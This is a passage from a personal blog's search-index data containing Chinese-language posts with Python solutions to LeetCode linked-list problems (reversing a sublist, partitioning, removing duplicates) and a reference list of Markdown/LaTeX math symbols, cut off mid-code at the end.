rear.next=new_node rear=new_node return head.nextclass Solution: def reverseBetween(self, head, m, n): \"\"\" :type head: ListNode :type m: int :type n: int :rtype: ListNode \"\"\" # Empty list if not head: return None # Move the two pointers until they reach the proper starting point # in the list. cur, prev = head, None while m &gt; 1: prev = cur cur = cur.next m, n = m - 1, n - 1 # The two pointers that will fix the final connections. tail, con = cur, prev # Iteratively reverse the nodes until n becomes 0. while n: third = cur.next cur.next = prev prev = cur cur = third n -= 1 # Adjust the final connections as explained in the algorithm if con: con.next = prev else: head = prev tail.next = cur return headif __name__==\"__main__\": a=[1,4,3,2,5,2] new_a=createLink_rearinsert(a) a1 = Solution() p=a1.reverseBetween(new_a,2,4) list1=[] while(p!=None): list1.append(p.val) #print(p.val) p=p.next print(list1) [1, 2, 3, 4, 5, 2]","categories":[{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"https://fishni.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"python","slug":"python","permalink":"https://fishni.github.io/tags/python/"},{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"https://fishni.github.io/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"},{"name":"链表","slug":"链表","permalink":"https://fishni.github.io/tags/%E9%93%BE%E8%A1%A8/"}]},{"title":"【数据结构与算法】【LeetCode】【链表】86. 分隔链表","slug":"LeetCode-A-链表-86. 分隔链表","date":"2020-11-16T16:00:00.000Z","updated":"2020-11-17T01:50:56.633Z","comments":true,"path":"2020/11/17/LeetCode-A-链表-86. 分隔链表/","link":"","permalink":"https://fishni.github.io/2020/11/17/LeetCode-A-%E9%93%BE%E8%A1%A8-86.%20%E5%88%86%E9%9A%94%E9%93%BE%E8%A1%A8/","excerpt":"链表分隔。","text":"链表分隔。 题目给定一个链表和一个特定值 x，对链表进行分隔，使得所有小于 x 的节点都在大于或等于 x 的节点之前。 你应当保留两个分区中每个节点的初始相对位置。 示例: 输入: head = 1-&gt;4-&gt;3-&gt;2-&gt;5-&gt;2, x = 3 输出: 1-&gt;2-&gt;2-&gt;4-&gt;3-&gt;5题解 双指针法，创建两个带头结点（哑结点）的指针before_x和after_x 遍历链表 将小于x的值添加到链表before_x中 大于等于x的值添加到链表after_x中 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647# Definition for singly-linked list.class ListNode: def __init__(self, x): self.val = x self.next = Nonedef createLink_rearinsert(lista): head = ListNode(-1) rear = head for i in lista: new_node=ListNode(i) rear.next=new_node rear=new_node return head.nextclass Solution: def partition(self, head: ListNode, x: int) -&gt; ListNode: # before_x构造小于x的节点链表,利用头结点，也即哑结点 before_x = ListNode(-1) # after_x 构造大于x的结点链表 after_x=ListNode(-1) b=before_x a=after_x # 遍历head while head!=None: if head.val&lt;x: b.next=head b=head head=head.next b.next=None elif head!=None: a.next=head a=head head=head.next a.next=None b.next=after_x.next return before_x.nextif __name__==\"__main__\": a=[1,4,3,2,5,2] x=3 new_a=createLink_rearinsert(a) a1 = Solution() p=a1.partition(new_a,x) list1=[] while(p!=None): list1.append(p.val) #print(p.val) p=p.next print(list1) [1, 2, 2, 4, 3, 5] 简化 123456789101112131415161718192021222324252627282930313233343536373839404142434445# Definition for singly-linked list.class ListNode: def __init__(self, x): self.val = x self.next = Nonedef createLink_rearinsert(lista): head = ListNode(-1) rear = head for i in lista: new_node=ListNode(i) rear.next=new_node rear=new_node return head.nextclass Solution: def partition(self, head: ListNode, x: int) -&gt; ListNode: # before_x构造小于x的节点链表,利用头结点，也即哑结点 before_x = ListNode(-1) # after_x 构造大于x的结点链表 after_x=ListNode(-1) b=before_x a=after_x # 遍历head while head: if head.val&lt;x: b.next=head b=b.next else: a.next=head a=a.next head=head.next a.next = None b.next=after_x.next return before_x.nextif __name__==\"__main__\": a=[1,4,3,2,5,2] x=3 new_a=createLink_rearinsert(a) a1 = Solution() p=a1.partition(new_a,x) list1=[] while(p!=None): list1.append(p.val) #print(p.val) p=p.next print(list1) [1, 2, 2, 4, 3, 5]","categories":[{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"https://fishni.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"python","slug":"python","permalink":"https://fishni.github.io/tags/python/"},{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"https://fishni.github.io/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"},{"name":"链表","slug":"链表","permalink":"https://fishni.github.io/tags/%E9%93%BE%E8%A1%A8/"}]},{"title":"【数据结构与算法】【LeetCode】【链表】83. 删除排序链表中的重复元素","slug":"LeetCode-A-链表-83. 删除排序链表中的重复元素","date":"2020-11-14T16:00:00.000Z","updated":"2020-11-15T02:24:14.139Z","comments":true,"path":"2020/11/15/LeetCode-A-链表-83. 删除排序链表中的重复元素/","link":"","permalink":"https://fishni.github.io/2020/11/15/LeetCode-A-%E9%93%BE%E8%A1%A8-83.%20%E5%88%A0%E9%99%A4%E6%8E%92%E5%BA%8F%E9%93%BE%E8%A1%A8%E4%B8%AD%E7%9A%84%E9%87%8D%E5%A4%8D%E5%85%83%E7%B4%A0/","excerpt":"将有序链表中重复出现的元素删除，每个元素出现一次。","text":"将有序链表中重复出现的元素删除，每个元素出现一次。 题目给定一个排序链表，删除所有重复的元素，使得每个元素只出现一次。 示例 示例 1: 输入: 1-&gt;1-&gt;2 输出: 1-&gt;2 示例 2: 输入: 1-&gt;1-&gt;2-&gt;3-&gt;3 输出: 1-&gt;2-&gt;3题解方法一仅用一个指针 通过将结点的值与它之后的结点进行比较来确定它是否为重复结点。如果它是重复的，我们更改当前结点的 next 指针，以便它跳过下一个结点并直接指向下一个结点之后的结点。123456789101112131415161718192021222324252627282930313233343536# Definition for singly-linked list.class ListNode: def __init__(self, x): self.val = x self.next = Nonedef createLink_rearinsert(lista): head = ListNode(-1) rear = head for i in lista: new_node=ListNode(i) rear.next=new_node rear=new_node return head.nextclass Solution(object): def deleteDuplicates(self, head): if not (head and head.next): return head current=head while current!=None and current.next!=None: if current.next.val==current.val: current.next=current.next.next else: current=current.next return headif __name__==\"__main__\": a=[1,1,1,2,4,4] new_a=createLink_rearinsert(a) a1 = Solution() p=a1.deleteDuplicates(new_a) list1=[] while(p!=None): list1.append(p.val) #print(p.val) p=p.next print(list1) [1, 2, 4]方法二使用了两个指针 12345678910111213141516171819202122232425262728293031323334353637383940414243# Definition for singly-linked list.class ListNode: def __init__(self, x): self.val = x self.next = Nonedef createLink_rearinsert(lista): head = ListNode(-1) rear = head for i in lista: new_node=ListNode(i) rear.next=new_node rear=new_node return head.nextclass Solution(object): def deleteDuplicates(self, head): if not (head and head.next): return head a = head b = head.next while b: if a.val!=b.val: a=b b=b.next else: while b and a.val==b.val: b = b.next a.next = b a=b b = b.next if b else None return headif __name__==\"__main__\": a=[1,1,1,2,4,4] new_a=createLink_rearinsert(a) a1 = Solution() p=a1.deleteDuplicates(new_a) list1=[] while(p!=None): list1.append(p.val) #print(p.val) p=p.next print(list1) [1, 2, 4]","categories":[{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"https://fishni.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"python","slug":"python","permalink":"https://fishni.github.io/tags/python/"},{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"https://fishni.github.io/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"},{"name":"链表","slug":"链表","permalink":"https://fishni.github.io/tags/%E9%93%BE%E8%A1%A8/"}]},{"title":"【杂项】01-MarkDown公式大全","slug":"杂项-01-markdown公式大全","date":"2020-11-14T16:00:00.000Z","updated":"2020-11-15T12:44:57.023Z","comments":true,"path":"2020/11/15/杂项-01-markdown公式大全/","link":"","permalink":"https://fishni.github.io/2020/11/15/%E6%9D%82%E9%A1%B9-01-markdown%E5%85%AC%E5%BC%8F%E5%A4%A7%E5%85%A8/","excerpt":"markdown公式符号大全。","text":"markdown公式符号大全。 上下标 $a_0$，$a_{pre}\\Longrightarrow$a_0，a_{pre} $a^0，a^{[0]}\\Longrightarrow$a^0，a^{[0]} 括号 $(,)\\Longrightarrow$(,) $[,]\\Longrightarrow$[,] $\\langle,\\rangle\\Longrightarrow$\\langle,\\rangle $\\lvert,\\rvert \\Longrightarrow$\\lvert,\\rvert $\\lVert,\\rVert\\Longrightarrow$ \\lVert, \\rVert $\\lbrace, \\rbrace\\Longrightarrow$\\lbrace, \\rbrace 或 \\{, \\} 增大括号方法 $(x)\\Longrightarrow$(x) $\\big( x \\big)\\Longrightarrow$\\big( x \\big) $\\Big( x \\Big)\\Longrightarrow$\\Big( x \\Big) $\\bigg( x \\bigg)\\Longrightarrow$\\bigg( x \\bigg) $\\Bigg( x \\Bigg)\\Longrightarrow$\\Bigg( x \\Bigg) 其他的大括号 $\\Bigg(\\bigg(\\Big(\\big((x)\\big)\\Big)\\bigg)\\Bigg)\\Longrightarrow$\\Bigg(\\bigg(\\Big(\\big((x)\\big)\\Big)\\bigg)\\Bigg) $\\Bigg[\\bigg[\\Big[\\big[[x]\\big]\\Big]\\bigg]\\Bigg]\\Longrightarrow$\\Bigg[\\bigg[\\Big[\\big[[x]\\big]\\Big]\\bigg]\\Bigg] $\\Bigg \\langle \\bigg \\langle \\Big \\langle\\big\\langle\\langle x \\rangle \\big \\rangle\\Big\\rangle\\bigg\\rangle\\Bigg\\rangle\\Longrightarrow$\\Bigg \\langle \\bigg \\langle \\Big \\langle\\big\\langle\\langle x \\rangle \\big \\rangle\\Big\\rangle\\bigg\\rangle\\Bigg\\rangle $\\Bigg\\lvert\\bigg\\lvert\\Big\\lvert\\big\\lvert\\lvert x \\rvert\\big\\rvert\\Big\\rvert\\bigg\\rvert\\Bigg\\rvert\\Longrightarrow$\\Bigg\\lvert\\bigg\\lvert\\Big\\lvert\\big\\lvert\\lvert x \\rvert\\big\\rvert\\Big\\rvert\\bigg\\rvert\\Bigg\\rvert $\\Bigg\\lVert\\bigg\\lVert\\Big\\lVert\\big\\lVert\\lVert x \\rVert\\big\\rVert\\Big\\rVert\\bigg\\rVert\\Bigg\\rVert\\Longrightarrow$\\Bigg\\lVert\\bigg\\lVert\\Big\\lVert\\big\\lVert\\lVert x \\rVert\\big\\rVert\\Big\\rVert\\bigg\\rVert\\Bigg\\rVert 运算括号 $\\lceil \\frac{x}{2} \\rceil\\Longrightarrow$\\lceil \\frac{x}{2} \\rceil $\\lfloor x \\rfloor\\Longrightarrow$\\lfloor x \\rfloor $\\lbrace \\sum_{i=0}^{n}i^{2}=\\frac{2a}{x^2+1} \\rbrace\\Longrightarrow$\\lbrace \\sum_{i=0}^{n}i^{2}=\\frac{2a}{x^2+1} \\rbrace $\\left\\lbrace \\sum_{i=0}^{n}i^{2}=\\frac{2a}{x^2+1} \\right\\rbrace\\Longrightarrow$\\left\\lbrace \\sum_{i=0}^{n}i^{2}=\\frac{2a}{x^2+1} \\right\\rbrace 分数 $\\frac{a}{b}\\Longrightarrow$\\frac{a}{b} 开方 $\\sqrt{a + b}\\Longrightarrow$\\sqrt{a + b} $\\sqrt[n]{a + b}\\Longrightarrow$\\sqrt[n]{a + b} 累加/累乘 $\\sum_{i = 0}^{n}\\frac{1}{i^2}\\Longrightarrow$\\sum_{i = 0}^{n}\\frac{1}{i^2} $\\prod_{i = 0}^{n}\\frac{1}{i^2}\\Longrightarrow$\\prod_{i = 0}^{n}\\frac{1}{i^2} 三角函数 $\\sin\\Longrightarrow$\\sin $\\cos\\Longrightarrow$\\cos $\\tan\\Longrightarrow$\\tan $\\cot\\Longrightarrow$\\cot $\\cot\\Longrightarrow$\\cot $\\csc\\Longrightarrow$\\csc $\\bot\\Longrightarrow$\\bot $\\angle\\Longrightarrow$\\angle $40^\\circ\\Longrightarrow$40^\\circ 对数函数 $\\ln{a + b}\\Longrightarrow$\\ln{a + b} $\\log_{a}^{b}\\Longrightarrow$\\log_{a}^{b} $\\lg{a + b}\\Longrightarrow$\\lg{a + b} 二元运算符 $\\pm\\Longrightarrow$\\pm $\\mp\\Longrightarrow$\\mp $\\times\\Longrightarrow$\\times $\\div\\Longrightarrow$\\div $\\ast\\Longrightarrow$\\ast $\\star\\Longrightarrow$\\star $\\mid\\Longrightarrow$\\mid $\\nmid\\Longrightarrow$\\nmid $\\circ\\Longrightarrow$\\circ $\\bullet\\Longrightarrow$\\bullet $\\cdot\\Longrightarrow$\\cdot $\\wr\\Longrightarrow$\\wr $\\diamond \\Longrightarrow$\\diamond $\\Diamond\\Longrightarrow$\\Diamond $\\triangle\\Longrightarrow$\\triangle $\\bigtriangleup\\Longrightarrow$\\bigtriangleup $\\bigtriangledown\\Longrightarrow$\\bigtriangledown $\\triangleleft\\Longrightarrow$\\triangleleft $\\triangleright\\Longrightarrow$\\triangleright $\\lhd\\Longrightarrow$\\lhd $\\rhd\\Longrightarrow$\\rhd $\\unlhd\\Longrightarrow$\\unlhd $\\unrhd\\Longrightarrow$\\unrhd $\\circ\\Longrightarrow$\\circ $\\bigcirc\\Longrightarrow$\\bigcirc $\\odot\\Longrightarrow$\\odot $\\bigodot\\Longrightarrow$\\bigodot $\\oslash\\Longrightarrow$\\oslash $\\ominus\\Longrightarrow$\\ominus $\\otimes\\Longrightarrow$\\otimes $\\bigotimes\\Longrightarrow$\\bigotimes $\\oplus\\Longrightarrow$\\oplus $\\bigoplus\\Longrightarrow$\\bigoplus $\\dagger\\Longrightarrow$\\dagger $\\ddagger\\Longrightarrow$\\ddagger $\\amalg\\Longrightarrow$\\amalg 关系运算符 $\\leq\\Longrightarrow$\\leq $\\geq\\Longrightarrow$\\geq $\\equiv\\Longrightarrow$\\equiv $\\models\\Longrightarrow$\\models $\\prec\\Longrightarrow$\\prec $\\succ\\Longrightarrow$\\succ $\\sim\\Longrightarrow$\\sim $\\perp\\Longrightarrow$\\perp $\\preceq\\Longrightarrow$\\preceq $\\succeq\\Longrightarrow$\\succeq $\\simeq\\Longrightarrow$\\simeq $\\mid\\Longrightarrow$\\mid $\\ll\\Longrightarrow$\\ll $\\gg\\Longrightarrow$\\gg $\\asymp\\Longrightarrow$\\asymp $\\parallel\\Longrightarrow$\\parallel $\\approx\\Longrightarrow$\\approx $\\cong\\Longrightarrow$\\cong $\\neq\\Longrightarrow$\\neq $\\doteq\\Longrightarrow$\\doteq $\\propto\\Longrightarrow$\\propto $\\bowtie\\Longrightarrow$\\bowtie $\\Join\\Longrightarrow$\\Join $\\smile\\Longrightarrow$\\smile $\\frown\\Longrightarrow$\\frown $\\vdash\\Longrightarrow$\\vdash $\\dashv\\Longrightarrow$\\dashv 极限 $\\lim\\Longrightarrow$\\lim $\\rightarrow\\Longrightarrow$\\rightarrow $\\infty\\Longrightarrow$\\infty $\\lim_{n\\rightarrow+\\infty}n\\Longrightarrow$\\lim_{n\\rightarrow+\\infty}n 向量 $\\vec{a}\\Longrightarrow$\\vec{a} 箭头 $\\uparrow\\Longrightarrow$\\uparrow $\\downarrow\\Longrightarrow$\\downarrow $\\updownarrow\\Longrightarrow$\\updownarrow $\\Uparrow\\Longrightarrow$\\Uparrow $\\Downarrow\\Longrightarrow$\\Downarrow $\\Updownarrow\\Longrightarrow$\\Updownarrow $\\rightarrow\\Longrightarrow$\\rightarrow $\\leftarrow\\Longrightarrow$\\leftarrow $\\leftrightarrow\\Longrightarrow$\\leftrightarrow $\\Rightarrow\\Longrightarrow$\\Rightarrow $\\Leftarrow\\Longrightarrow$\\Leftarrow $\\Leftrightarrow\\Longrightarrow$\\Leftrightarrow $\\longrightarrow\\Longrightarrow$\\longrightarrow $\\longleftarrow\\Longrightarrow$\\longleftarrow $\\longleftrightarrow\\Longrightarrow$\\longleftrightarrow $\\Longrightarrow\\Longrightarrow$\\Longrightarrow $\\Longleftarrow\\Longrightarrow$\\Longleftarrow $\\Longleftrightarrow\\Longrightarrow$\\Longleftrightarrow $\\mapsto\\Longrightarrow$\\mapsto $\\longmapsto\\Longrightarrow$\\longmapsto $\\hookleftarrow\\Longrightarrow$\\hookleftarrow $\\hookrightarrow\\Longrightarrow$\\hookrightarrow $\\rightharpoonup\\Longrightarrow$\\rightharpoonup $\\leftharpoondown\\Longrightarrow$\\leftharpoondown $\\rightleftharpoons\\Longrightarrow$\\rightleftharpoons $\\leftharpoonup\\Longrightarrow$\\leftharpoonup $\\rightharpoondown\\Longrightarrow$\\rightharpoondown $\\leadsto\\Longrightarrow$\\leadsto $\\nearrow\\Longrightarrow$\\nearrow $\\searrow\\Longrightarrow$\\searrow $\\swarrow\\Longrightarrow$\\swarrow $\\nwarrow\\Longrightarrow$\\nwarrow 集合 $\\emptyset\\Longrightarrow$\\emptyset $\\in\\Longrightarrow$\\in $\\in\\Longrightarrow$\\in $\\notin\\Longrightarrow$\\notin $\\subset\\Longrightarrow$\\subset $\\supset\\Longrightarrow$\\supset $\\not\\subset\\Longrightarrow$\\not\\subset $\\subseteq\\Longrightarrow$\\subseteq $\\supseteq\\Longrightarrow$\\supseteq $\\cup\\Longrightarrow$\\cup $\\bigcup\\Longrightarrow$\\bigcup $\\cap\\Longrightarrow$\\cap $\\bigcap\\Longrightarrow$\\bigcap $\\uplus\\Longrightarrow$\\uplus $\\biguplus\\Longrightarrow$\\biguplus $\\sqsubset\\Longrightarrow$\\sqsubset $\\sqsupset\\Longrightarrow$\\sqsupset $\\sqcap\\Longrightarrow$\\sqcap $\\sqsubseteq\\Longrightarrow$\\sqsubseteq $\\sqsupseteq\\Longrightarrow$\\sqsupseteq $\\vee\\Longrightarrow$\\vee $\\wedge\\Longrightarrow$\\wedge $\\setminus\\Longrightarrow$\\setminus 微积分 $\\prime\\Longrightarrow$\\prime $\\int\\Longrightarrow$\\int $\\iint\\Longrightarrow$\\iint $\\iiint\\Longrightarrow$\\iiint $\\oint\\Longrightarrow$\\oint $\\nabla\\Longrightarrow$\\nabla $\\int_0^2 x^2 dx\\Longrightarrow$\\int_0^2 x^2 dx 逻辑运算 $\\because\\Longrightarrow$\\because $\\therefore\\Longrightarrow$\\therefore $\\forall\\Longrightarrow$\\forall $\\exists\\Longrightarrow$\\exists $\\vee\\Longrightarrow$\\vee $\\wedge\\Longrightarrow$\\wedge $\\bigvee\\Longrightarrow$\\bigvee $\\bigwedge\\Longrightarrow$\\bigwedge 上下标符号 $\\bar{a}\\Longrightarrow$\\bar{a} $\\acute\\Longrightarrow$\\acute $\\breve{a}\\Longrightarrow$\\breve{a} $\\grave{a}\\Longrightarrow$\\grave{a} $\\dot{a}\\Longrightarrow$\\dot{a} $\\ddot{a}\\Longrightarrow$\\ddot{a} $\\hat{a}\\Longrightarrow$\\hat{a} $\\check{a}\\Longrightarrow$\\check{a} $\\breve{a}\\Longrightarrow$\\breve{a} $\\tilde{a}\\Longrightarrow$\\tilde{a} $\\vec{a}\\Longrightarrow$\\vec{a} $\\overline{a + b + c + d}\\Longrightarrow$\\overline{a + b + c + d} $\\underline{a + b + c + d}\\Longrightarrow$\\underline{a + b + c + d} $\\overbrace{a + b + c + d}\\Longrightarrow$\\overbrace{a + b + c + d} $\\underline{a + b + c + d}\\Longrightarrow$\\underline{a + b + c + d} $\\overbrace{a + \\underbrace{b + c}{1.0} + d}^{2.0}\\Longrightarrow$\\overbrace{a + \\underbrace{b + c}{1.0} + d}^{2.0} 希腊字母 $\\Gamma\\Longrightarrow$\\Gamma $\\Delta\\Longrightarrow$\\Delta $\\Theta\\Longrightarrow$\\Theta $\\Lambda\\Longrightarrow$\\Lambda $\\Xi\\Longrightarrow$\\Xi $\\Pi\\Longrightarrow$\\Pi $\\Sigma\\Longrightarrow$\\Sigma $\\Upsilon\\Longrightarrow$\\Upsilon $\\Phi\\Longrightarrow$\\Phi $\\Psi\\Longrightarrow$\\Psi $\\Omega\\Longrightarrow$\\Omega $\\alpha\\Longrightarrow$\\alpha $\\beta\\Longrightarrow$\\beta $\\gamma\\Longrightarrow$\\gamma $\\delta\\Longrightarrow$\\delta $\\epsilon\\Longrightarrow$\\epsilon $\\varepsilon\\Longrightarrow$\\varepsilon $\\zeta\\Longrightarrow$\\zeta $\\eta\\Longrightarrow$\\eta $\\theta\\Longrightarrow$\\theta $\\iota\\Longrightarrow$\\iota $\\kappa\\Longrightarrow$\\kappa $\\lambda\\Longrightarrow$\\lambda $\\mu\\Longrightarrow$\\mu $\\nu\\Longrightarrow$\\nu $\\xi\\Longrightarrow$\\xi $\\omicron\\Longrightarrow$\\omicron $\\pi\\Longrightarrow$\\pi $\\rho\\Longrightarrow$\\rho $\\sigma\\Longrightarrow$\\sigma $\\tau\\Longrightarrow$\\tau $\\upsilon\\Longrightarrow$\\upsilon $\\phi\\Longrightarrow$\\phi $\\varphi\\Longrightarrow$\\varphi $\\chi\\Longrightarrow$\\chi $\\psi\\Longrightarrow$\\psi $\\omega\\Longrightarrow$\\omega 省略号 $\\dots\\Longrightarrow$\\dots $\\ldots\\Longrightarrow$\\ldots $\\cdots\\Longrightarrow$\\cdots $\\vdots\\Longrightarrow$\\vdots $\\ddots\\Longrightarrow$\\ddots $$x_1, x_2, \\dots, x_n \\quad \\quad 1, 2, \\cdots, n \\quad \\quad \\vdots \\quad\\quad \\ddots$$ 空格 $123\\quad123\\Longrightarrow$123\\quad123 $123\\qquad123\\Longrightarrow$123\\qquad123 其他符号 $\\aleph\\Longrightarrow$\\aleph $\\hbar\\Longrightarrow$\\hbar $\\imath\\Longrightarrow$\\imath $\\jmath\\Longrightarrow$\\jmath $\\ell\\Longrightarrow$\\ell $\\wp\\Longrightarrow$\\wp $\\Re\\Longrightarrow$\\Re $\\Im\\Longrightarrow$\\Im $\\mho\\Longrightarrow$\\mho $\\nabla\\Longrightarrow$\\nabla $\\surd\\Longrightarrow$\\surd $\\top\\Longrightarrow$\\top $\\bot\\Longrightarrow$\\bot $\\neg\\Longrightarrow$\\neg $\\flat\\Longrightarrow$\\flat $\\natural\\Longrightarrow$\\natural $\\sharp\\Longrightarrow$\\sharp $\\backslash\\Longrightarrow$\\backslash $\\partial\\Longrightarrow$\\partial $\\Box\\Longrightarrow$\\Box $\\clubsuit\\Longrightarrow$\\clubsuit $\\diamondsuit\\Longrightarrow$\\diamondsuit $\\heartsuit\\Longrightarrow$\\heartsuit $\\spadesuit\\Longrightarrow$\\spadesuit 公式分支公式$$y=\\begin{cases}-x,\\quad x\\leq 0\\x, \\quad x&gt;0\\end{cases}\\tag{1}$$ $$ y= \\begin{cases} -x,\\quad x\\leq 0\\\\ x, \\quad x&gt;0 \\end{cases} \\tag{1} $$ 矩阵 不带括号 $$\\begin{matrix}1 &amp; 2 &amp; 3\\4 &amp; 5 &amp; 6 \\7 &amp; 8 &amp; 9\\end{matrix}\\tag{1}$$ $$ \\begin{matrix} 1 &amp; 2 &amp; 3\\\\ 4 &amp; 5 &amp; 6 \\\\ 7 &amp; 8 &amp; 9 \\end{matrix} \\tag{1} $$ 括号$$\\left(\\begin{matrix}1 &amp; 2 &amp; 3\\4 &amp; 5 &amp; 6 \\7 &amp; 8 &amp; 9\\end{matrix}\\right)\\tag{2}$$$$\\left( \\begin{matrix} 1 &amp; 2 &amp; 3\\\\ 4 &amp; 5 &amp; 6 \\\\ 7 &amp; 8 &amp; 9 \\end{matrix} \\right) \\tag{2}$$ 中括号$$\\left[\\begin{matrix}1 &amp; 2 &amp; 3\\4 &amp; 5 &amp; 6 \\7 &amp; 8 &amp; 9\\end{matrix}\\right]\\tag{3}$$$$\\left[ \\begin{matrix} 1 &amp; 2 &amp; 3\\\\ 4 &amp; 5 &amp; 6 \\\\ 7 &amp; 8 &amp; 9 \\end{matrix} \\right] \\tag{3}$$ 大括号 $$\\left{\\begin{matrix}1 &amp; 2 &amp; 3\\4 &amp; 5 &amp; 6 \\7 &amp; 8 &amp; 9\\end{matrix}\\right}\\tag{4}$$ $$\\left\\{ \\begin{matrix} 1 &amp; 2 &amp; 3\\\\ 4 &amp; 5 &amp; 6 \\\\ 7 &amp; 8 &amp; 9 \\end{matrix} \\right\\} \\tag{4} $$ 带省略号$$\\left[\\begin{matrix}a &amp; b &amp; \\cdots &amp; a\\b &amp; b &amp; \\cdots &amp; b\\\\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots\\c &amp; c &amp; \\cdots &amp; c\\end{matrix}\\right]\\tag{5}$$$$ \\left[ \\begin{matrix} a &amp; b &amp; \\cdots &amp; a\\\\ b &amp; b &amp; \\cdots &amp; b\\\\ \\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots\\\\ c &amp; c &amp; \\cdots &amp; c \\end{matrix} \\right] \\tag{5} $$ 带横竖线分割的矩阵$$\\left[\\begin{array}{c|cc}1 &amp; 2 &amp; 3 \\4 &amp; 5 &amp; 6 \\7 &amp; 8 &amp; 9\\end{array}\\right]\\tag{6}$$ $$ \\left[ \\begin{array}{c|cc} 1 &amp; 2 &amp; 3 \\\\ 4 &amp; 5 &amp; 6 \\\\ 7 &amp; 8 &amp; 9 \\end{array} \\right] \\tag{6} $$ 横线用 \\hline 分割$$\\left[ \\begin{array}{c|cc} 1 &amp; 2 &amp; 3 \\ \\hline 4 &amp; 5 &amp; 6 \\ 7 &amp; 8 &amp; 9 \\end{array}\\right]\\tag{7}$$ $$ \\left[ \\begin{array}{c|cc} 1 &amp; 2 &amp; 3 \\\\ \\hline 4 &amp; 5 &amp; 6 \\\\ 7 &amp; 8 &amp; 9 \\end{array} \\right] \\tag{7} $$","categories":[{"name":"杂项","slug":"杂项","permalink":"https://fishni.github.io/categories/%E6%9D%82%E9%A1%B9/"}],"tags":[{"name":"markdown公式","slug":"markdown公式","permalink":"https://fishni.github.io/tags/markdown%E5%85%AC%E5%BC%8F/"}]},{"title":"【数据结构与算法】【LeetCode】【链表】82. 删除排序链表中的重复元素 II","slug":"LeetCode-A-链表-82. 删除排序链表中的重复元素 II","date":"2020-11-12T16:00:00.000Z","updated":"2020-11-13T08:47:08.721Z","comments":true,"path":"2020/11/13/LeetCode-A-链表-82. 删除排序链表中的重复元素 II/","link":"","permalink":"https://fishni.github.io/2020/11/13/LeetCode-A-%E9%93%BE%E8%A1%A8-82.%20%E5%88%A0%E9%99%A4%E6%8E%92%E5%BA%8F%E9%93%BE%E8%A1%A8%E4%B8%AD%E7%9A%84%E9%87%8D%E5%A4%8D%E5%85%83%E7%B4%A0%20II/","excerpt":"将有序链表中重复出现的元素删除。","text":"将有序链表中重复出现的元素删除。 题目给定一个排序链表，删除所有含有重复数字的节点，只保留原始链表中 没有重复出现 的数字。 示例 1: 输入: 1-&gt;2-&gt;3-&gt;3-&gt;4-&gt;4-&gt;5 输出: 1-&gt;2-&gt;5 示例 2: 输入: 1-&gt;1-&gt;1-&gt;2-&gt;3 输出: 2-&gt;3题解方法一：比较笨的方法：利用哈希表记录每个值得频率 遍历链表，将每个节点的值放到哈希表中，哈希表的key就是节点的值，value是这个值出现的频率 遍历哈希表，将所有频率==1的key放到集合中 对集合进行排序 遍历集合，然后不断创建新的链表节点 当然这里可以优化一下，比如使用LinkedHashMap或者OrderedDict这样的数据结构，可以省去排序环节。 完整代码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849# Definition for singly-linked list.class ListNode: def __init__(self, x): self.val = x self.next = Nonedef createLink_rearinsert(lista): head = ListNode(-1) rear = head for i in lista: new_node=ListNode(i) rear.next=new_node rear=new_node return head.nextclass Solution(): def deleteDuplicates(self, head): if not (head and head.next): return head # 用哈希表记录每个节点值的出现频率 d = dict() p = head arr = [] while p: val = p.val d[val] = d.setdefault(val,0)+1 p = p.next # 将所有只出现一次的值放到arr中，之后再对这个arr排序 for k in d: if d[k]==1: arr.append(k) arr = sorted(arr) dummy = ListNode(-1) p = dummy # 创建长度为len(arr)长度的链表，依次将arr中的值赋给每个链表节点 for i in arr: tmp = ListNode(i) p.next = tmp p = p.next return dummy.nextif __name__==\"__main__\": a=[-1,1,1,2,4] new_a=createLink_rearinsert(a) a1 = Solution() p=a1.deleteDuplicates(new_a) list1=[] while(p!=None): list1.append(p.val) #print(p.val) p=p.next print(list1) [-1, 2, 4]方法二双指针的方式，定义a，b两个指针。 考虑到一些边界条件，比如1-&gt;1-&gt;1-&gt;2这种情况，需要把开头的几个1给去掉，我们增加一个哑结点，方便边界处理。 初始的两个指针如下: 将a指针指向哑结点 将b指针指向head(哑结点的下一个节点) 如果a指向的值不等于b指向的值，则两个指针都前进一位 否则，就单独移动b，b不断往前走，直到a指向的值不等于b指向的值。 注意，这里不是直接比较a.val==b.val，这么比较不对，因为初始的时候，a指向的是哑结点，所以比较逻辑应该是这样： a.next.val == b.next.val 当两个指针指向的值相等时，b不断往前移动，这里是通过一个while循环判断的，因为要过滤掉1-&gt;2-&gt;2-&gt;2-&gt;3重复的2。 那么整个逻辑就是两个while，但时间复杂度不是O(N^2)，而是O(N)，空间上也只是常数级别。123456789101112131415161718192021222324252627282930313233343536373839404142434445# Definition for singly-linked list.class ListNode: def __init__(self, x): self.val = x self.next = Nonedef createLink_rearinsert(lista): head = ListNode(-1) rear = head for i in lista: new_node=ListNode(i) rear.next=new_node rear=new_node return head.nextclass Solution(object): def deleteDuplicates(self, head): if not (head and head.next): return head dummy = ListNode(-1) dummy.next = head a = dummy b = head while b and b.next: # 初始化的时a指向的是哑结点，所以比较逻辑应该是a的下一个节点和b的下一个节点 if a.next.val!=b.next.val: a = a.next b = b.next else: # 如果a、b指向的节点值相等，就不断移动b，直到a、b指向的值不相等 